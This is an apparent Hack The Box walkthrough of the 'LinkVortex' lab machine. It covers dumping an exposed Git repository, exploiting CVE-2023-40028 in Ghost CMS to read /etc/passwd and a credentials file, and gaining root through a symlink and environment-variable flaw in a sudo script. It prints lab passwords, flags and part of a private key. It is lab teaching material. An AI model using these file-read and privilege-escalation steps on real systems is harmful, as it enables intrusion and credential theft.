---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Easy
  - VirtualHosts
  - VHOST
  - Git
  - CVE-2023-40028
  - ArbitraryFileRead
  - GhostCMS
  - sudo
  - symlink
---

![](images/LinkVortex.png)

## Summary

The box starts with a `Git repository` stored on a `website` running on a configured `VHOST`. After `dumping` the `repository` some information about the underlying `Content Management System (CMS)` can be obtained. The `repository` also contains a `Dockerfile` which provides information about a `configuration file`. This file contains `credentials` required for the `foothold`. In order to read this file the `CVE-2023-40028` which describes `Arbitrary File Read` vulnerability in `Ghost CMS 5.58` needs to be abused. After getting the `credentials` from the file login as the user `bob` is possible and also access to the `user.txt`. The `enumeration` then shows the permission to execute a `custom script` with `sudo`. The `safety checks` within the script can be abused by `chaining` files using `symlinks` and finally setting a `variable` to execute `/bin/bash` as an `option` to `escalate privileges` to `root` and to obtain the `root.txt`.

## Table of Contents

- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Enumerating VHOST Configuration](#Enumerating-VHOST-Configuration)
    - [Directory Busting](#Directory-Busting)
    - [Checking robots.txt](#Checking-robotstxt)
    - [Enumeration of dev.linkvortex.htb](#Enumeration-of-devlinkvortexhtb)
        - [Dumping Git Repository](#Dumping-Git-Repository)
- [Investigating the Git Repository Files](#Investigating-the-Git-Repository-Files)
- [Foothold](#Foothold)
    - [CVE-2023-40028: Arbitrary File Read in Ghost CMS 5.58](#CVE-2023-40028-Arbitrary-File-Read-in-Ghost-CMS-558)
- [user.txt](#usertxt)
- [Enumeration](#Enumeration)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
- [root.txt](#roottxt)
- [Post Exploitation](#Post-Exploitation)

## Reconnaissance

### Port Scanning

The box started with only offering port `22/TCP` and port `80/TCP` as expected.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.118.155
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 08:09 CET
Nmap scan report for 10.129.118.155
Host is up (0.021s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://linkvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.33 seconds
```

### Enumeration of Port 80/TCP

We noticed the `redirect` on port `80/TCP` and added `linkvortex.htb` to our `/etc/hosts` file.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.118.155  linkvortex.htb
```

Then we accessed the website and performed a quick check on the `web technology stack` by using `WhatWeb`.

- [http://linkvortex.htb/](http://linkvortex.htb/)

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://linkvortex.htb/
http://linkvortex.htb/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.129.118.155], JQuery[3.5.1], MetaGenerator[Ghost 5.58], Open-Graph-Protocol[website], PoweredBy[Ghost,a], Script[application/ld+json], Title[BitByBit Hardware], X-Powered-By[Express], X-UA-Compatible[IE=edge]
```

![](images/2024-12-08_08-11_80_website.png)

### Enumerating VHOST Configuration

Since we got redirected to an actual `domain`, our second step was to look for potential configured `virtual host routing` aka `VHOSTs`.

And indeed we found `dev.linkvortex.htb` which we then added to our `/etc/hosts` file in order to access it.

```c
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.linkvortex.htb" -u http://linkvortex.htb/ --fs 230

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 230
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 18ms]
:: Progress: [151265/151265] :: Job [1/1] :: 43 req/sec :: Duration: [0:17:26] :: Errors: 7 ::
```

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.118.155  linkvortex.htb
10.129.118.155  dev.linkvortex.htb
```

### Directory Busting

We checked `linkvortex.htb` and `dev.linkvortex.htb` for interesting `files` and `folders` and found a `Git repository` on `http://dev.linkvortex.htb/.git/`.

```c
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://linkvortex.htb/ -x 404

  _|. _ _  _  _  _ _|_    v0.4.3                                                 
 (_||| _) (/_(_|| (_| )                                                                                                                                
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_linkvortex.htb/__24-12-08_10-37-09.txt

Target: http://linkvortex.htb/

[10:37:09] Starting:                                                             
[10:37:43] 301 -  179B  - /assets  ->  /assets/                             
[10:37:44] 301 -    0B  - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp/
[10:37:44] 301 -    0B  - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp/    
[10:37:44] 301 -    0B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp/
[10:37:49] 301 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js/
[10:37:58] 301 -    0B  - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf/
[10:37:58] 301 -    0B  - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf/
[10:38:00] 200 -   15KB - /favicon.ico                                      
[10:38:00] 301 -    0B  - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf/
[10:38:08] 301 -    0B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf/
[10:38:10] 200 -    1KB - /LICENSE                                          
[10:38:28] 200 -  103B  - /robots.txt                                       
[10:38:30] 403 -  199B  - /server-status/                                   
[10:38:30] 403 -  199B  - /server-status                                    
[10:38:32] 200 -  255B  - /sitemap.xml                                      
                                                                             
Task Completed
```

```c
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://dev.linkvortex.htb/ -x 404

  _|. _ _  _  _  _ _|_    v0.4.3                                                 
 (_||| _) (/_(_|| (_| )                                                                                                                                           
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_dev.linkvortex.htb/__24-12-08_10-39-36.txt

Target: http://dev.linkvortex.htb/

[10:39:36] Starting:                                                             
[10:39:38] 301 -  239B  - /.git  ->  http://dev.linkvortex.htb/.git/        
[10:39:38] 200 -  201B  - /.git/config                                      
[10:39:38] 200 -   73B  - /.git/description                                 
[10:39:38] 200 -   41B  - /.git/HEAD
[10:39:38] 200 -  620B  - /.git/hooks/                                      
[10:39:38] 200 -  402B  - /.git/info/                                       
[10:39:38] 200 -  401B  - /.git/logs/                                       
[10:39:38] 200 -  418B  - /.git/objects/                                    
[10:39:38] 200 -  147B  - /.git/packed-refs                                 
[10:39:38] 301 -  249B  - /.git/refs/tags  ->  http://dev.linkvortex.htb/.git/refs/tags/
[10:39:38] 200 -  557B  - /.git/                                            
[10:39:38] 200 -  240B  - /.git/info/exclude                                
[10:39:38] 200 -  175B  - /.git/logs/HEAD                                   
[10:39:38] 200 -  393B  - /.git/refs/                                       
[10:39:39] 403 -  199B  - /.ht_wsr.txt                                      
[10:39:39] 403 -  199B  - /.htaccess.bak1                                   
[10:39:39] 403 -  199B  - /.htaccess.save                                   
[10:39:39] 403 -  199B  - /.htaccess_orig
[10:39:39] 403 -  199B  - /.htaccessBAK                                     
[10:39:39] 403 -  199B  - /.htaccessOLD2
[10:39:39] 403 -  199B  - /.html                                            
[10:39:39] 403 -  199B  - /.htm
[10:39:39] 403 -  199B  - /.htpasswd_test                                   
[10:39:39] 403 -  199B  - /.htpasswds
[10:39:39] 403 -  199B  - /.httr-oauth
[10:39:39] 403 -  199B  - /.htaccess.orig                                   
[10:39:39] 403 -  199B  - /.htaccessOLD                                     
[10:39:39] 403 -  199B  - /.htaccess.sample                                 
[10:39:39] 403 -  199B  - /.htaccess_sc                                     
[10:39:44] 403 -  199B  - /.htaccess_extra                                  
[10:40:04] 200 -  691KB - /.git/index                                       
[10:40:06] 403 -  199B  - /cgi-bin/                                         
[10:40:39] 403 -  199B  - /server-status/                                   
[10:40:39] 403 -  199B  - /server-status
                                                                             
Task Completed
```

### Checking robots.txt

Before we actually started looking into the `Git repository` we first checked the `robots.txt` to find some `low-hanging fruits` and notices the `/ghost/` directory on the `main website`.

```c
┌──(kali㉿kali)-[~]
└─$ curl http://linkvortex.htb/robots.txt
User-agent: *
Sitemap: http://linkvortex.htb/sitemap.xml
Disallow: /ghost/
Disallow: /p/
Disallow: /email/
Disallow: /r/
```

We saved this information for later.

### Enumeration of dev.linkvortex.htb

On the configured `VHOST` we didn't find anything useful.

![](images/2024-12-08_10-32_80_vhost_website.png)

#### Dumping Git Repository

And so we moved directly to `dumping` the `Git repository` by using `git-dumper`.

- [https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper)

To not `break` any `system packages` we installed the `requirements` inside a `virtual environment`.

```c
┌──(kali㉿kali)-[~/opt/01_information_gathering/git-dumper]
└─$ python3 -m venv venv
```

```c
┌──(kali㉿kali)-[~/opt/01_information_gathering/git-dumper]
└─$ source venv/bin/activate
```

```c
┌──(venv)─(kali㉿kali)-[~/opt/01_information_gathering/git-dumper]
└─$ pip3 install -r requirements.txt 
Collecting PySocks (from -r requirements.txt (line 1))
  Downloading PySocks-1.7.1-py3-none-any.whl.metadata (13 kB)
Collecting requests (from -r requirements.txt (line 2))
  Using cached requests-2.32.3-py3-none-any.whl.metadata (4.6 kB)
Collecting beautifulsoup4 (from -r requirements.txt (line 3))
  Downloading beautifulsoup4-4.12.3-py3-none-any.whl.metadata (3.8 kB)
Collecting dulwich (from -r requirements.txt (line 4))
  Downloading dulwich-0.22.6-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.3 kB)
Collecting charset-normalizer<4,>=2 (from requests->-r requirements.txt (line 2))
  Using cached charset_normalizer-3.4.0-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (34 kB)
Collecting idna<4,>=2.5 (from requests->-r requirements.txt (line 2))
  Using cached idna-3.10-py3-none-any.whl.metadata (10 kB)
Collecting urllib3<3,>=1.21.1 (from requests->-r requirements.txt (line 2))
  Using cached urllib3-2.2.3-py3-none-any.whl.metadata (6.5 kB)
Collecting certifi>=2017.4.17 (from requests->-r requirements.txt (line 2))
  Using cached certifi-2024.8.30-py3-none-any.whl.metadata (2.2 kB)
Collecting soupsieve>1.2 (from beautifulsoup4->-r requirements.txt (line 3))
  Downloading soupsieve-2.6-py3-none-any.whl.metadata (4.6 kB)
Downloading PySocks-1.7.1-py3-none-any.whl (16 kB)
Using cached requests-2.32.3-py3-none-any.whl (64 kB)
Downloading beautifulsoup4-4.12.3-py3-none-any.whl (147 kB)
Downloading dulwich-0.22.6-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (978 kB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 978.2/978.2 kB 20.1 MB/s eta 0:00:00
Using cached certifi-2024.8.30-py3-none-any.whl (167 kB)
Using cached charset_normalizer-3.4.0-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (143 kB)
Using cached idna-3.10-py3-none-any.whl (70 kB)
Downloading soupsieve-2.6-py3-none-any.whl (36 kB)
Using cached urllib3-2.2.3-py3-none-any.whl (126 kB)
Installing collected packages: urllib3, soupsieve, PySocks, idna, charset-normalizer, certifi, requests, dulwich, beautifulsoup4
Successfully installed PySocks-1.7.1 beautifulsoup4-4.12.3 certifi-2024.8.30 charset-normalizer-3.4.0 dulwich-0.22.6 idna-3.10 requests-2.32.3 soupsieve-2.6 urllib3-2.2.3
```

```c
┌──(venv)─(kali㉿kali)-[~/opt/01_information_gathering/git-dumper]
└─$ python3 git_dumper.py http://dev.linkvortex.htb/.git/ dump/
[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
[-] Testing http://dev.linkvortex.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
[-] Fetching http://dev.linkvortex.htb/.git/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/config [200]
[-] Fetching http://dev.linkvortex.htb/.git/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/description [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/packed-refs [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/index [200]
[-] Fetching http://dev.linkvortex.htb/.git/shallow [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/update.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/exclude [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.pack [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/54b0ed7f9c9aedf3180ee1fd94e7e43b29f000 [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/864e0261278525197724b394ed4292414d9fec [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.idx [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/v5.57.3 [200]
[-] Running git checkout .
Updated 5596 paths from the index
```

## Investigating the Git Repository Files

We found a `configuration file` for `Docker` which contained some interesting `paths` like `/var/lib/ghost/config.production.json`.

```c
┌──(venv)─(kali㉿kali)-[~/opt/01_information_gathering/git-dumper/dump]
└─$ cat Dockerfile.ghost 
FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json

# Prevent installing packages
RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb

# Wait for the db to be ready first
COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
COPY entry.sh /entry.sh
RUN chmod +x /var/lib/ghost/wait-for-it.sh
RUN chmod +x /entry.sh

ENTRYPOINT ["/entry.sh"]
CMD ["node", "current/index.js"]
```

We also found the `application` which was running on `dev.linkvortex.htb`.

```c
┌──(venv)─(kali㉿kali)-[~/opt/01_information_gathering/git-dumper/dump]
└─$ head package.json
{
  "name": "ghost-monorepo",
  "version": "0.0.0-private",
  "description": "The professional publishing platform",
  "private": true,
  "repository": "https://github.com/TryGhost/Ghost",
  "author": "Ghost Foundation",
  "license": "MIT",
  "workspaces": [
    "ghost/*",
```

- [https://github.com/TryGhost/Ghost](https://github.com/TryGhost/Ghost)

And within a `commit` we found the `version` of `Ghost CMS`.

```c
┌──(venv)─(kali㉿kali)-[~/opt/01_information_gathering/git-dumper/dump]
└─$ git log
commit 299cdb4387763f850887275a716153e84793077d (HEAD, tag: v5.58.0)
Author: Ghost CI <41898282+github-actions[bot]@users.noreply.github.com>
Date:   Fri Aug 4 15:02:54 2023 +0000

    v5.58.0

<--- CUT FOR BREVITY --->
```

| Version |
| ------- |
| 5.58.0  |

As we looked deeper into the files and started searching for `credentials` we found a lot of different `passwords`.

```c
┌──(venv)─(kali㉿kali)-[~/…/01_information_gathering/git-dumper/dump/ghost]
└─$ grep -R 'const password' -A 3 -B 3
<--- CUT FOR BREVITY --->
core/test/regression/api/admin/authentication.test.js:            const password = 'OctopiFociPilfer45';
<--- CUT FOR BREVITY --->
core/test/regression/api/admin/authentication.test.js:            const password = 'thisissupersafe';
<--- CUT FOR BREVITY --->
```

We wrote down the ones which occurred the most for later.

| Password           |
| ------------------ |
| OctopiFociPilfer45 |
| thisissupersafe    |
| Sl1m3rson99        |
| qu33nRul35         |
## Foothold

### CVE-2023-40028: Arbitrary File Read in Ghost CMS 5.58

A quick search on our favorite search engine `Google` brought up the `CVE-2023-40028` which described an `Arbitrary File Read` vulnerability in version `5.58` of `Ghost CMS`.

We also found a `Proof of Concept (PoC)` exploit for this vulnerability.

- [https://github.com/0xyassine/CVE-2023-40028](https://github.com/0xyassine/CVE-2023-40028)

We modified the `URL` within the `Proof of Concept (PoC)` and tested some obvious `usernames` in combination with the previously found `passwords`.

```c
┌──(kali㉿kali)-[/media/…/Machines/LinkVortex/files/CVE-2023-40028]
└─$ head -20 CVE-2023-40028.sh
#!/bin/bash

# Exploit Title: Ghost Arbitrary File Read
# Date: 10-03-2024
# Exploit Author: Mohammad Yassine
# Vendor Homepage: https://ghost.org/
# Version: BEFORE [ 5.59.1 ]
# Tested on: [ debian 11 bullseye ghost docker image ]
# CVE : CVE-2023-40028

#THIS EXPLOIT WAS TESTED AGAINST A SELF HOSTED GHOST IMAGE USING DOCKER

#GHOST ENDPOINT
GHOST_URL='http://linkvortex.htb'
GHOST_API="$GHOST_URL/ghost/api/v3/admin/"
API_VERSION='v3.0'

PAYLOAD_PATH="`dirname $0`/exploit"
PAYLOAD_ZIP_NAME=exploit.zip
```

And eventually `admin@linkvortex.htb` worked as `username` together with one of the `passwords`.

```c
┌──(kali㉿kali)-[/media/…/Machines/LinkVortex/files/CVE-2023-40028]
└─$ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file>
```

First we checked the `/etc/passwd` for all available `usernames` on the system.

```c
file> /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin node:x:1000:1000::/home/node:/bin/bash
```

Then we checked the `path` for the `config.production.json` which we found inside the `Dockerfile` and got granted a few credentials.

```c
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```

| Username | Password              |
| -------- | --------------------- |
| bob      | fibber-talented-worth |

Luckily for us the `credentials` worked on `SSH` and therefore we got access to the `user.txt` inside the `home directory` of `bob`.

```c
┌──(kali㉿kali)-[~]
└─$ ssh bob@linkvortex.htb
The authenticity of host 'linkvortex.htb (10.129.118.139)' can't be established.
ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'linkvortex.htb' (ED25519) to the list of known hosts.
bob@linkvortex.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
bob@linkvortex:~$
```

## user.txt

```c
bob@linkvortex:~$ cat user.txt 
c5fb63f091de1b0610cd1fda2148c9ec
```

## Enumeration

As `bob` we started a quick `enumeration` to check our `capabilities` for `privilege escalation`.

The user was just part of the `default groups` but had permission to execute a `custom script` with `sudo`.

```c
bob@linkvortex:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
```

```c
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

## Privilege Escalation to root

We checked the `clean_symlink.sh` script located within `/opt/ghost/` and found some interesting `vulnerabilities` within the code.

```c
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh 
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

It seemed that if we could provide a `.png file` which we `linked` to some other file it would show us the `output` when accessed. This would happen if the `variable` named `CHECK_CONTENT` would be `set`. If so the script would retrieve the file by using `cat`.

The script did not properly validate `CHECK_CONTENT`. Instead of ensuring it's a boolean (`true` or `false`), the script executed the value directly when the variable was set. When `CHECK_CONTENT` was getting checked later in the script (`if $CHECK_CONTENT;`), the shell interpreted the variable's value (`/bin/bash`) as a command, which then got executed.

The script also detected `critical files` within `etc` and `root`. In order to abuse that we needed to chain a `proxy file`.

So we `linked` the desired file `root.txt` with our `proxy file` named `foobar`. Actually would every file worked as long as we would set the `variable` correctly later on.

```c
bob@linkvortex:/tmp$ ln -s /root/root.txt foobar
```

Then we `linked` our `proxy file` with an actual `.png file`.

```c
bob@linkvortex:/tmp$ ln -s foobar foobar.png
```

```c
bob@linkvortex:/tmp$ ls -la
total 84
drwxrwxrwt 12 root root 36864 Dec  8 10:26 .
drwxr-xr-x 18 root root  4096 Nov 30 10:07 ..
drwxrwxrwt  2 root root  4096 Dec  8 09:59 .ICE-unix
drwxrwxrwt  2 root root  4096 Dec  8 09:59 .Test-unix
drwxrwxrwt  2 root root  4096 Dec  8 09:59 .X11-unix
drwxrwxrwt  2 root root  4096 Dec  8 09:59 .XIM-unix
drwxrwxrwt  2 root root  4096 Dec  8 09:59 .font-unix
lrwxrwxrwx  1 bob  bob     14 Dec  8 10:26 foobar -> /root/root.txt
lrwxrwxrwx  1 bob  bob      6 Dec  8 10:26 foobar.png -> foobar
drwx------  3 root root  4096 Dec  8 09:59 systemd-private-f143386770d049ca926b8ad1c4c6b692-apache2.service-cUd3YT
drwx------  3 root root  4096 Dec  8 09:59 systemd-private-f143386770d049ca926b8ad1c4c6b692-systemd-logind.service-bHHa68
drwx------  3 root root  4096 Dec  8 09:59 systemd-private-f143386770d049ca926b8ad1c4c6b692-systemd-resolved.service-8uwneB
drwx------  3 root root  4096 Dec  8 09:59 systemd-private-f143386770d049ca926b8ad1c4c6b692-systemd-timesyncd.service-P4K8Dd
drwx------  2 root root  4096 Dec  8 10:00 vmware-root_494-826976239
```

Then we `exported` the `variable` and pointed it to `/bin/bash`.

```c
bob@linkvortex:/tmp$ export CHECK_CONTENT=/bin/bash
```

After executing the command using `sudo` we got a `shell` as `root` and obtained the `root.txt`.

```c
bob@linkvortex:/tmp$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
Link found [ foobar.png ] , moving it to quarantine
root@linkvortex:/tmp#
```

## root.txt

```c
root@linkvortex:~# cat root.txt 
612349e484254c2667e801dc567acaaa
```

## Post Exploitation

```c
root@linkvortex:~/.ssh# cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmpHVhV11MW7eGt9WeJ23rVuqlWnMpF+FclWYwp4SACcAilZdOF8T
q2egYfeMmgI9IoM0DdyDKS4vG+lIoWoJEfZf+cVwaZIzTZwKm7ECbF2Oy+u2SD+X7lG9A6
V1xkmWhQWEvCiI22UjIoFkI0oOfDrm6ZQTyZF99AqBVcwGCjEA67eEKt/5oejN5YgL7Ipu
6sKpMThUctYpWnzAc4yBN/mavhY7v5+TEV0FzPYZJ2spoeB3OGBcVNzSL41ctOiqGVZ7yX
TQ6pQUZxR4zqueIZ7yHVsw5j0eeqlF8OvHT81wbS5ozJBgtjxySWrRkkKAcY11tkTln6NK
CssRzP1r9kbmgHswClErHLL/CaBb/04g65A0xESAt5H1wuSXgmipZT8Mq54lZ4ZNMgPi53
jzZbaHGHACGxLgrBK5u4mF3vLfSG206ilAgU1sUETdkVz8wYuQb2S4Ct0AT14obmje7oqS
0cBqVEY8/m6olYaf/U8dwE/w9beosH6T7arEUwnhAAAFiDyG/Tk8hv05AAAAB3NzaC1yc2
EAAAGBAJqR1YVddTFu3hrfVnidt61bqpVpzKRfhXJVmMKeEgAnAIpWXThfE6tnoGH3jJoC
PSKDNA3cgykuLxvpSKFqCRH2X/nFcGmSM02cCpuxAmxdjsvrtkg/l+5RvQOldcZJloUFhL
woiNtlIyKBZCNKDnw65umUE8mRffQKgVXMBgoxAOu3hCrf+aHozeWIC+yKburCqTE4VHLW
KVp8wHOMgTf5mr4WO7+fkxFdBcz2GSdrKaHgdzhgXFTc0i+NXLToqhlWe8l00OqUFGcUeM
6rniGe8h1bMOY9HnqpRfDrx0/NcG0uaMyQYLY8cklq0ZJCgHGNdbZE5Z+jSgrLEcz9a/ZG
